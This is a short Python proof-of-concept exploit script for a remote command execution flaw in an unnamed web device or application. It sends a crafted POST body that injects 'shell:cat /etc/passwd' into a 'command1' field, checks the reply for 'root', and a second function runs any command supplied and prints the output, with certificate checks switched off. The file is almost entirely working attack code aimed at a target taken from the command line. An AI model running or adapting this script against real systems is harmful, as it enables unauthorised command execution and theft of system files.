import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning



def POC_1(target_url):
    vuln_url = target_url + "/(download)/tmp/a.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "root" in response.text and response.status_code == 200:
            print("[+] The target has a remote command execution vulnerability.")


    except:
        print("[-] Remote command execution vulnerability does not exist. ")

def POC_2(target_url, cmd):
    vuln_url = target_url + "/(download)/tmp/a.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "command1=shell:{}| dd of=/tmp/a.txt".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[36m{} \033[0m".format(response.text))
    except:
        print("[-] Remote command execution vulnerability does not exist. ")

if __name__ == '__main__':
    url = sys.argv[1]
    target_url = "http://"+url
    POC_1(target_url)
